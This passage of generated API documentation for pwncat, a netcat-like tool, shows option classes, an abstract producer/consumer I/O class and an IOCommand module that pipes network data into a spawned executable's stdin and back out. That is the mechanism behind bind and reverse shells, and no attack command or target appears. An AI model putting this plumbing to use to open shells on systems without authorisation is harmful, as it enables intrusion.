    &#34;&#34;&#34;`ast.AST`: custom Python code which provides a `transform(data, pse) -&gt; str` function.&#34;&#34;&#34;
    return self.__code</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerAction.consumer"><code class="name">var <span class="ident">consumer</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.IO.consumer" href="#pwncat.IO.consumer">IO.consumer()</a></code>: Data consumer function.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def consumer(self):
    # type: () -&gt; Callable[[str], None]
    &#34;&#34;&#34;`IO.consumer`: Data consumer function.&#34;&#34;&#34;
    return self.__consumer</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerAction.interrupts"><code class="name">var <span class="ident">interrupts</span></code></dt>
<dd>
<div class="desc"><p><code>[List[Callable[[], None]]]</code>: List of interrupt functions for the producer/consumer.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def interrupts(self):
    # type: () -&gt; List[Callable[[], None]]
    &#34;&#34;&#34;`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer.&#34;&#34;&#34;
    return self.__interrupts</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerAction.producer"><code class="name">var <span class="ident">producer</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.IO.producer" href="#pwncat.IO.producer">IO.producer()</a></code>: Data producer function.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def producer(self):
    # type: () -&gt; Callable[[], Iterator[str]]
    &#34;&#34;&#34;`IO.producer`: Data producer function.&#34;&#34;&#34;
    return self.__producer</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerAction.transformers"><code class="name">var <span class="ident">transformers</span></code></dt>
<dd>
<div class="desc"><p><code>[Transform.transformer]</code>: List of transformer functions applied before consumer.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def transformers(self):
    # type: () -&gt; List[Transform]
    &#34;&#34;&#34;`[Transform.transformer]`: List of transformer functions applied before consumer.&#34;&#34;&#34;
    return self.__transformers</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsRunnerTimer"><code class="flex name class">
<span>class <span class="ident">DsRunnerTimer</span></span>
<span>(</span><span>action, signal, intvl, *args, **kwargs)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for Timer functions for the Runner class.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsRunnerTimer(object):
    &#34;&#34;&#34;A type-safe data structure for Timer functions for the Runner class.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def action(self):
        # type: () -&gt; Callable[..., None]
        &#34;&#34;&#34;`Callable[..., None]`: function to be run periodically.&#34;&#34;&#34;
        return self.__action

    @property
    def intvl(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: interval at which to run the action function..&#34;&#34;&#34;
        return self.__intvl

    @property
    def args(self):
        # type: () -&gt; Tuple[Any, ...]
        &#34;&#34;&#34;`*args`: optional *args for the action function.&#34;&#34;&#34;
        return self.__args

    @property
    def kwargs(self):
        # type: () -&gt; Dict[str, Any]
        &#34;&#34;&#34;`**kargs`: optional *kwargs for the action function.&#34;&#34;&#34;
        return self.__kwargs

    @property
    def signal(self):
        # type: () -&gt; StopSignal
        &#34;&#34;&#34;`StopSignal`: StopSignal instance.&#34;&#34;&#34;
        return self.__signal

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        action,  # type: Callable[..., None]
        signal,  # type: StopSignal
        intvl,  # type: int
        *args,  # type: Tuple[Any, ...]
        **kwargs  # type: Dict[str, Any]
    ):
        # type: (...) -&gt; None
        assert type(intvl) is int, type(intvl)
        assert type(kwargs) is dict, type(kwargs)
        self.__action = action
        self.__signal = signal
        self.__intvl = intvl
        self.__args = args
        self.__kwargs = kwargs</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsRunnerTimer.action"><code class="name">var <span class="ident">action</span></code></dt>
<dd>
<div class="desc"><p><code>Callable[&hellip;, None]</code>: function to be run periodically.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def action(self):
    # type: () -&gt; Callable[..., None]
    &#34;&#34;&#34;`Callable[..., None]`: function to be run periodically.&#34;&#34;&#34;
    return self.__action</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerTimer.args"><code class="name">var <span class="ident">args</span></code></dt>
<dd>
<div class="desc"><p><code>*args</code>: optional *args for the action function.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def args(self):
    # type: () -&gt; Tuple[Any, ...]
    &#34;&#34;&#34;`*args`: optional *args for the action function.&#34;&#34;&#34;
    return self.__args</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerTimer.intvl"><code class="name">var <span class="ident">intvl</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: interval at which to run the action function..</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def intvl(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: interval at which to run the action function..&#34;&#34;&#34;
    return self.__intvl</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerTimer.kwargs"><code class="name">var <span class="ident">kwargs</span></code></dt>
<dd>
<div class="desc"><p><code>**kargs</code>: optional *kwargs for the action function.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def kwargs(self):
    # type: () -&gt; Dict[str, Any]
    &#34;&#34;&#34;`**kargs`: optional *kwargs for the action function.&#34;&#34;&#34;
    return self.__kwargs</code></pre>
</details>
</dd>
<dt id="pwncat.DsRunnerTimer.signal"><code class="name">var <span class="ident">signal</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code>: StopSignal instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def signal(self):
    # type: () -&gt; StopSignal
    &#34;&#34;&#34;`StopSignal`: StopSignal instance.&#34;&#34;&#34;
    return self.__signal</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsSock"><code class="flex name class">
<span>class <span class="ident">DsSock</span></span>
<span>(</span><span>bufsize, backlog, recv_timeout, nodns, ipv6, udp, ip_tos, info)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for DsSock options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsSock(object):
    &#34;&#34;&#34;A type-safe data structure for DsSock options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def bufsize(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: Receive buffer size.&#34;&#34;&#34;
        return self.__bufsize

    @property
    def backlog(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: Listen backlog.&#34;&#34;&#34;
        return self.__backlog

    @property
    def recv_timeout(self):
        # type: () -&gt; Optional[float]
        &#34;&#34;&#34;`float` or `None`: Receive timeout to change blocking socket to time-out based.&#34;&#34;&#34;
        return self.__recv_timeout

    @property
    def nodns(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Determines if we resolve hostnames or not.&#34;&#34;&#34;
        return self.__nodns

    @property
    def ipv6(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Determines if we use IPv6 instead of IPv4.&#34;&#34;&#34;
        return self.__ipv6

    @property
    def udp(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Determines if we use TCP or UDP.&#34;&#34;&#34;
        return self.__udp

    @property
    def ip_tos(self):
        # type: () -&gt; Optional[str]
        &#34;&#34;&#34;`str`: Determines what IP_TOS (Type of Service) value to set for the socket.&#34;&#34;&#34;
        return self.__ip_tos

    @property
    def info(self):
        # type: () -&gt; str
        &#34;&#34;&#34;`str`: Determines what info to display about the socket connection.&#34;&#34;&#34;
        return self.__info

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, bufsize, backlog, recv_timeout, nodns, ipv6, udp, ip_tos, info):
        # type: (int, int, Optional[float], bool, bool, bool, Optional[str], str) -&gt; None
        assert type(bufsize) is int, type(bufsize)
        assert type(backlog) is int, type(backlog)
        assert type(recv_timeout) is float, type(recv_timeout)
        assert type(nodns) is bool, type(nodns)
        assert type(ipv6) is bool, type(ipv6)
        assert type(udp) is bool, type(udp)
        assert type(info) is str, type(info)
        self.__bufsize = bufsize
        self.__backlog = backlog
        self.__recv_timeout = recv_timeout
        self.__nodns = nodns
        self.__ipv6 = ipv6
        self.__udp = udp
        self.__ip_tos = ip_tos
        self.__info = info</code></pre>
</details>
<h3>Subclasses</h3>
<ul class="hlist">
<li><a title="pwncat.DsIONetworkSock" href="#pwncat.DsIONetworkSock">DsIONetworkSock</a></li>
</ul>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsSock.backlog"><code class="name">var <span class="ident">backlog</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: Listen backlog.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def backlog(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: Listen backlog.&#34;&#34;&#34;
    return self.__backlog</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.bufsize"><code class="name">var <span class="ident">bufsize</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: Receive buffer size.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def bufsize(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: Receive buffer size.&#34;&#34;&#34;
    return self.__bufsize</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.info"><code class="name">var <span class="ident">info</span></code></dt>
<dd>
<div class="desc"><p><code>str</code>: Determines what info to display about the socket connection.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def info(self):
    # type: () -&gt; str
    &#34;&#34;&#34;`str`: Determines what info to display about the socket connection.&#34;&#34;&#34;
    return self.__info</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.ip_tos"><code class="name">var <span class="ident">ip_tos</span></code></dt>
<dd>
<div class="desc"><p><code>str</code>: Determines what IP_TOS (Type of Service) value to set for the socket.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def ip_tos(self):
    # type: () -&gt; Optional[str]
    &#34;&#34;&#34;`str`: Determines what IP_TOS (Type of Service) value to set for the socket.&#34;&#34;&#34;
    return self.__ip_tos</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.ipv6"><code class="name">var <span class="ident">ipv6</span></code></dt>
<dd>
<div class="desc"><p><code>bool</code>: Determines if we use IPv6 instead of IPv4.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def ipv6(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;`bool`: Determines if we use IPv6 instead of IPv4.&#34;&#34;&#34;
    return self.__ipv6</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.nodns"><code class="name">var <span class="ident">nodns</span></code></dt>
<dd>
<div class="desc"><p><code>bool</code>: Determines if we resolve hostnames or not.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def nodns(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;`bool`: Determines if we resolve hostnames or not.&#34;&#34;&#34;
    return self.__nodns</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.recv_timeout"><code class="name">var <span class="ident">recv_timeout</span></code></dt>
<dd>
<div class="desc"><p><code>float</code> or <code>None</code>: Receive timeout to change blocking socket to time-out based.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def recv_timeout(self):
    # type: () -&gt; Optional[float]
    &#34;&#34;&#34;`float` or `None`: Receive timeout to change blocking socket to time-out based.&#34;&#34;&#34;
    return self.__recv_timeout</code></pre>
</details>
</dd>
<dt id="pwncat.DsSock.udp"><code class="name">var <span class="ident">udp</span></code></dt>
<dd>
<div class="desc"><p><code>bool</code>: Determines if we use TCP or UDP.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def udp(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;`bool`: Determines if we use TCP or UDP.&#34;&#34;&#34;
    return self.__udp</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsTransformLinefeed"><code class="flex name class">
<span>class <span class="ident">DsTransformLinefeed</span></span>
<span>(</span><span>crlf)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for DsTransformLinefeed options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsTransformLinefeed(object):
    &#34;&#34;&#34;A type-safe data structure for DsTransformLinefeed options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def crlf(self):
        # type: () -&gt; Optional[str]
        &#34;&#34;&#34;`bool`: Converts line endings to LF, CRLF or CR and noop on `None`.&#34;&#34;&#34;
        return self.__crlf

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, crlf):
        # type: (Optional[str]) -&gt; None
        super(DsTransformLinefeed, self).__init__()
        self.__crlf = crlf</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsTransformLinefeed.crlf"><code class="name">var <span class="ident">crlf</span></code></dt>
<dd>
<div class="desc"><p><code>bool</code>: Converts line endings to LF, CRLF or CR and noop on <code>None</code>.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def crlf(self):
    # type: () -&gt; Optional[str]
    &#34;&#34;&#34;`bool`: Converts line endings to LF, CRLF or CR and noop on `None`.&#34;&#34;&#34;
    return self.__crlf</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.IO"><code class="flex name class">
<span>class <span class="ident">IO</span></span>
<span>(</span><span>ssig)</span>
</code></dt>
<dd>
<div class="desc"><p>Abstract class to for pwncat I/O modules.</p>
<p>This is a skeleton that defines how the I/O module for pwncat should look like.</p>
<p>The "producer" should constantly yield data received from some sort of input
which could be user input, output from a shell command data from a socket.</p>
<p>The "callback" will apply some sort of action on the data received from a producer
which could be output to stdout, send it to the shell or to a socket.</p>
<p>"The "interrupts" are a list of funtions that trigger the producer to stop
and return to its parent thread/function. The producer must also be implemented
in a way that it is able to act on the event which the "interrupt" func emitted.</p>
<p>Set specific options for this IO module.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ssig</code></strong> :&ensp;<code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></dt>
<dd>StopSignal instance used by the interrupter.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class IO(ABC):  # type: ignore
    &#34;&#34;&#34;Abstract class to for pwncat I/O modules.

    This is a skeleton that defines how the I/O module for pwncat should look like.

    The &#34;producer&#34; should constantly yield data received from some sort of input
    which could be user input, output from a shell command data from a socket.

    The &#34;callback&#34; will apply some sort of action on the data received from a producer
    which could be output to stdout, send it to the shell or to a socket.

    &#34;The &#34;interrupts&#34; are a list of funtions that trigger the producer to stop
    and return to its parent thread/function. The producer must also be implemented
    in a way that it is able to act on the event which the &#34;interrupt&#34; func emitted.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def ssig(self):
        # type: () -&gt; StopSignal
        &#34;&#34;&#34;`StopSignal`: Read only property to provide a StopSignal instance to IO.&#34;&#34;&#34;
        return self.__ssig

    @property
    def log(self):
        # type: () -&gt; logging.Logger
        &#34;&#34;&#34;`TraceLogger`: Logger instance.&#34;&#34;&#34;
        return self.__log

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    @abstractmethod
    def __init__(self, ssig):
        # type: (StopSignal) -&gt; None
        &#34;&#34;&#34;Set specific options for this IO module.

        Args:
            ssig (StopSignal): StopSignal instance used by the interrupter.
        &#34;&#34;&#34;
        super(IO, self).__init__()
        self.__ssig = ssig
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    @abstractmethod
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Implement a generator function which constantly yields data.

        The data could be from various sources such as: received from a socket,
        received from user input, received from shell command output or anything else.

        Yields:
            str: Data generated/produced by this function.
        &#34;&#34;&#34;

    @abstractmethod
    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Define a consumer callback which will apply an action on the producer output.

        Args:
            data (str): Data retrieved from the producer to work on.
        &#34;&#34;&#34;

    @abstractmethod
    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Define an interrupt function which will stop the producer.

        Various producer might call blocking functions and they won&#39;t be able to stop themself
        as they hang on that blocking function.
        NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.

        You should at least implement it with &#34;self.ssig.raise_stop()&#34;
        &#34;&#34;&#34;</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li>abc.ABC</li>
</ul>
<h3>Subclasses</h3>
<ul class="hlist">
<li><a title="pwncat.IOCommand" href="#pwncat.IOCommand">IOCommand</a></li>
<li><a title="pwncat.IONetwork" href="#pwncat.IONetwork">IONetwork</a></li>
<li><a title="pwncat.IOStdinStdout" href="#pwncat.IOStdinStdout">IOStdinStdout</a></li>
</ul>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.IO.log"><code class="name">var <span class="ident">log</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.TraceLogger" href="#pwncat.TraceLogger">TraceLogger</a></code>: Logger instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def log(self):
    # type: () -&gt; logging.Logger
    &#34;&#34;&#34;`TraceLogger`: Logger instance.&#34;&#34;&#34;
    return self.__log</code></pre>
</details>
</dd>
<dt id="pwncat.IO.ssig"><code class="name">var <span class="ident">ssig</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code>: Read only property to provide a StopSignal instance to IO.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def ssig(self):
    # type: () -&gt; StopSignal
    &#34;&#34;&#34;`StopSignal`: Read only property to provide a StopSignal instance to IO.&#34;&#34;&#34;
    return self.__ssig</code></pre>
</details>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="pwncat.IO.consumer"><code class="name flex">
<span>def <span class="ident">consumer</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Define a consumer callback which will apply an action on the producer output.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>data</code></strong> :&ensp;<code>str</code></dt>
<dd>Data retrieved from the producer to work on.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@abstractmethod
def consumer(self, data):
    # type: (str) -&gt; None
    &#34;&#34;&#34;Define a consumer callback which will apply an action on the producer output.

    Args:
        data (str): Data retrieved from the producer to work on.
    &#34;&#34;&#34;</code></pre>
</details>
</dd>
<dt id="pwncat.IO.interrupt"><code class="name flex">
<span>def <span class="ident">interrupt</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Define an interrupt function which will stop the producer.</p>
<p>Various producer might call blocking functions and they won't be able to stop themself
as they hang on that blocking function.
NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.</p>
<p>You should at least implement it with "self.ssig.raise_stop()"</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@abstractmethod
def interrupt(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Define an interrupt function which will stop the producer.

    Various producer might call blocking functions and they won&#39;t be able to stop themself
    as they hang on that blocking function.
    NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.

    You should at least implement it with &#34;self.ssig.raise_stop()&#34;
    &#34;&#34;&#34;</code></pre>
</details>
</dd>
<dt id="pwncat.IO.producer"><code class="name flex">
<span>def <span class="ident">producer</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Implement a generator function which constantly yields data.</p>
<p>The data could be from various sources such as: received from a socket,
received from user input, received from shell command output or anything else.</p>
<h2 id="yields">Yields</h2>
<dl>
<dt><code>str</code></dt>
<dd>Data generated/produced by this function.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@abstractmethod
def producer(self):
    # type: () -&gt; Iterator[str]
    &#34;&#34;&#34;Implement a generator function which constantly yields data.

    The data could be from various sources such as: received from a socket,
    received from user input, received from shell command output or anything else.

    Yields:
        str: Data generated/produced by this function.
    &#34;&#34;&#34;</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.IOCommand"><code class="flex name class">
<span>class <span class="ident">IOCommand</span></span>
<span>(</span><span>ssig, opts)</span>
</code></dt>
<dd>
<div class="desc"><p>Implement command execution functionality.</p>
<h2 id="attributes">Attributes</h2>
<dl>
<dt><strong><code>proc</code></strong> :&ensp;<code>subprocess.Popen</code></dt>
<dd>subprocess.Popen instance.</dd>
</dl>
<p>Set specific options for this I/O module.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ssig</code></strong> :&ensp;<code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></dt>
<dd>Instance of StopSignal.</dd>
<dt><strong><code>opts</code></strong> :&ensp;<code><a title="pwncat.DsIOCommand" href="#pwncat.DsIOCommand">DsIOCommand</a></code></dt>
<dd>Custom module options.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class IOCommand(IO):
    &#34;&#34;&#34;Implement command execution functionality.

    Attributes:
        proc (subprocess.Popen): subprocess.Popen instance.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, opts):
        # type: (StopSignal, DsIOCommand) -&gt; None
        &#34;&#34;&#34;Set specific options for this I/O module.

        Args:
            ssig (StopSignal): Instance of StopSignal.
            opts (DsIOCommand): Custom module options.
        &#34;&#34;&#34;
        super(IOCommand, self).__init__(ssig)
        self.__opts = opts
        self.log.debug(&#34;Setting &#39;%s&#39; as executable&#34;, self.__opts.executable)

        # Define destructor
        atexit.register(self.__destruct__)

        # Open executable to wait for commands
        env = os.environ.copy()
        try:
            self.proc = Popen(
                self.__opts.executable,
                stdin=PIPE,
                stdout=PIPE,
                stderr=STDOUT,
                bufsize=self.__opts.bufsize,
                shell=False,
                env=env,
            )
        except FileNotFoundError:
            self.log.error(&#34;Specified executable &#39;%s&#39; not found&#34;, self.__opts.executable)
            sys.exit(1)
        # Python-2 compat (doesn&#39;t have FileNotFoundError)
        except OSError:
            self.log.error(&#34;Specified executable &#39;%s&#39; not found&#34;, self.__opts.executable)
            sys.exit(1)

    def __destruct__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Destructor.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;Killing executable: %s with pid %d&#34;, self.__opts.executable, self.proc.pid
        )
        self.proc.kill()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Constantly ask for input.

        Yields:
            str: Data received from command output.
        &#34;&#34;&#34;
        assert self.proc.stdout is not None
        while True:
            if self.ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged in Command&#34;)  # type: ignore
                return
            self.log.trace(&#34;Reading command output&#34;)  # type: ignore
            data = self.proc.stdout.readline()  # Much better performance than self.proc.read(1)
            self.log.trace(&#34;Command output: %s&#34;, repr(data))  # type: ignore
            if not data:
                self.log.trace(&#34;Command output was empty. Exiting loop.&#34;)  # type: ignore
                break
            yield self.__opts.enc.decode(data)

    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Send data received to stdin (command input).

        Args:
            data (str): Command to execute.
        &#34;&#34;&#34;
        assert self.proc.stdin is not None
        byte = self.__opts.enc.encode(data)
        self.log.trace(&#34;Appending to stdin: %s&#34;, repr(byte))  # type: ignore
        self.proc.stdin.write(byte)
        self.proc.stdin.flush()

    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;[IOCommand] subprocess.kill() was raised by input_unterrupter()&#34;
        )
        self.proc.kill()
        # Raise stop signal
        # TODO: Check if this is required???
        self.ssig.raise_stop()</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="pwncat.IO" href="#pwncat.IO">IO</a></li>
<li>abc.ABC</li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="pwncat.IOCommand.consumer"><code class="name flex">
<span>def <span class="ident">consumer</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<div class="desc"><p>Send data received to stdin (command input).</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>data</code></strong> :&ensp;<code>str</code></dt>
<dd>Command to execute.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def consumer(self, data):
    # type: (str) -&gt; None
    &#34;&#34;&#34;Send data received to stdin (command input).

    Args:
        data (str): Command to execute.
    &#34;&#34;&#34;
    assert self.proc.stdin is not None
    byte = self.__opts.enc.encode(data)
    self.log.trace(&#34;Appending to stdin: %s&#34;, repr(byte))  # type: ignore
    self.proc.stdin.write(byte)
    self.proc.stdin.flush()</code></pre>
</details>
</dd>
<dt id="pwncat.IOCommand.interrupt"><code class="name flex">
<span>def <span class="ident">interrupt</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Stop function that can be called externally to close this instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def interrupt(self):
    # type: () -&gt; None
    &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
    self.log.trace(  # type: ignore
        &#34;[IOCommand] subprocess.kill() was raised by input_unterrupter()&#34;
    )
    self.proc.kill()
    # Raise stop signal
    # TODO: Check if this is required???
    self.ssig.raise_stop()</code></pre>
</details>
</dd>
<dt id="pwncat.IOCommand.producer"><code class="name flex">
<span>def <span class="ident">producer</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Constantly ask for input.</p>
<h2 id="yields">Yields</h2>
<dl>
<dt><code>str</code></dt>
<dd>Data received from command output.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def producer(self):
    # type: () -&gt; Iterator[str]
    &#34;&#34;&#34;Constantly ask for input.

    Yields:
        str: Data received from command output.
    &#34;&#34;&#34;
    assert self.proc.stdout is not None
    while True:
        if self.ssig.has_stop():
            self.log.trace(&#34;Stop signal acknowledged in Command&#34;)  # type: ignore
            return
        self.log.trace(&#34;Reading command output&#34;)  # type: ignore
        data = self.proc.stdout.readline()  # Much better performance than self.proc.read(1)
        self.log.trace(&#34;Command output: %s&#34;, repr(data))  # type: ignore
        if not data:
            self.log.trace(&#34;Command output was empty. Exiting loop.&#34;)  # type: ignore
            break
        yield self.__opts.enc.decode(data)</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="pwncat.IO" href="#pwncat.IO">IO</a></b></code>:
<ul class="hlist">
<li><code><a title="pwncat.IO.log" href="#pwncat.IO.log">log</a></code></li>
<li><code><a title="pwncat.IO.ssig" href="#pwncat.IO.ssig">ssig</a></code></li>
</ul>
</li>
</ul>
</dd>
<dt id="pwncat.IONetwork"><code class="flex name class">
<span>class <span class="ident">IONetwork</span></span>
<span>(</span><span>ssig, encoder, host, ports, role, srv_opts, cli_opts, sock_opts)</span>
</code></dt>
<dd>
<div class="desc"><p>Pwncat implementation based on custom Socket library.</p>
<p>Create a Pwncat instance of either a server or a client.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ssig</code></strong> :&ensp;<code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></dt>
<dd>Stop signal instance</dd>
<dt><strong><code>encoder</code></strong> :&ensp;<code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></dt>
<dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
<dt><strong><code>host</code></strong> :&ensp;<code>str</code></dt>
<dd>The hostname to resolve.</dd>
<dt><strong><code>ports</code></strong> :&ensp;<code>[int]</code></dt>
<dd>List of ports to connect to or listen on.</dd>
<dt><strong><code>role</code></strong> :&ensp;<code>str</code></dt>
<dd>Either "server" or "client".</dd>
<dt><strong><code>srv_opts</code></strong> :&ensp;<code><a title="pwncat.DsIONetworkSrv" href="#pwncat.DsIONetworkSrv">DsIONetworkSrv</a></code></dt>
<dd>Options for the server.</dd>
<dt><strong><code>cli_opts</code></strong> :&ensp;<code><a title="pwncat.DsIONetworkCli" href="#pwncat.DsIONetworkCli">DsIONetworkCli</a></code></dt>
<dd>Options for the client.</dd>
<dt><strong><code>sock_opts</code></strong> :&ensp;<code><a title="pwncat.DsIONetworkSock" href="#pwncat.DsIONetworkSock">DsIONetworkSock</a></code></dt>
